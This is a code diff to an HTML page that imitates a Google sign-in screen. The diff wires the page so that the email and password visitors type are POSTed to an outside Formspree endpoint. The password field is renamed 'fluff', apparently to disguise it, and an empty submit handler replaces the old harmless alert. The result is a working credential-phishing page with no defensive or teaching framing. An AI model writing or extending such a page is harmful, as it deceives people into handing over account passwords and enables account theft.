@@ -134,6 +134,9 @@
             justify-content: center;
             margin-top: 5px;
         }
+        #passwordLabel {
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -148,20 +151,26 @@
         </div>
 
         <div class="right-side-container">
-            <input type="email" id="emailInput" class="input-box" placeholder="Email or phone" autocomplete="username">
-            <input type="password" id="passwordInput" class="input-box" placeholder="Enter your password" autocomplete="current-password" style="display: none;">
-            
-            <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>
+            <!-- Create a form to submit to Formspree -->
+            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
+                <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
+                <div id="passwordContainer" style="display: none;">
+                    <label for="fluff" id="passwordLabel">Enter your fluff</label>
+                    <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password">
+                </div>
 
-            <div class="guest-mode">
-                Not your computer? Use a private browsing window to sign in. <br>
-                <a href="#" class="link">Learn more about using Guest mode</a>
-            </div>
+                <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>
 
-            <div class="btn-container">
-                <a href="#" class="link" id="createAccountLink">Create account</a>
-                <button class="btn" id="nextButton" onclick="goToPasswordPage()">Next</button>
-            </div>
+                <div class="guest-mode">
+                    Not your computer? Use a private browsing window to sign in. <br>
+                    <a href="#" class="link">Learn more about using Guest mode</a>
+                </div>
+
+                <div class="btn-container">
+                    <a href="#" class="link" id="createAccountLink">Create account</a>
+                    <button type="submit" class="btn" id="nextButton" onclick="goToPasswordPage(event)">Next</button>
+                </div>
+            </form>
         </div>
     </div>
 
@@ -175,33 +184,28 @@
     </div>
 
     <script>
-        function goToPasswordPage() {
+        function goToPasswordPage(event) {
+            event.preventDefault(); // Prevent form submission for now
+
             var email = document.getElementById('emailInput').value;
 
-            // Check if the email is entered
             if (email) {
-                document.getElementById('signinText').textContent = 'Enter your password';
+                document.getElementById('signinText').textContent = 'Enter your fluff'; // Update text
                 document.getElementById('useGoogleText').style.display = 'none';
                 document.getElementById('emailInput').style.display = 'none';
                 document.getElementById('forgotEmailLink').style.display = 'none';
                 document.getElementById('createAccountLink').style.display = 'none';
-                document.getElementById('passwordInput').style.display = 'block';
+                document.getElementById('passwordContainer').style.display = 'block';
                 document.getElementById('nextButton').textContent = 'Sign In';
-                document.getElementById('nextButton').setAttribute('onclick', 'submitPassword()');
+                document.getElementById('nextButton').setAttribute('onclick', 'submitPassword(event)');
             } else {
                 alert("Please enter an email address.");
             }
         }
 
-        function submitPassword() {
-            var password = document.getElementById('passwordInput').value;
-
-            if (password) {
-                // You can replace this with your own logic to handle password submission
-                alert("Password submitted successfully!");
-            } else {
-                alert("Please enter a password.");
-            }
+        function submitPassword(event) {
+            // Handle the form submission here (Formspree will handle the email and fluff)
+            // We can remove this line as the form submission will happen automatically
         }
     </script>
 </body>
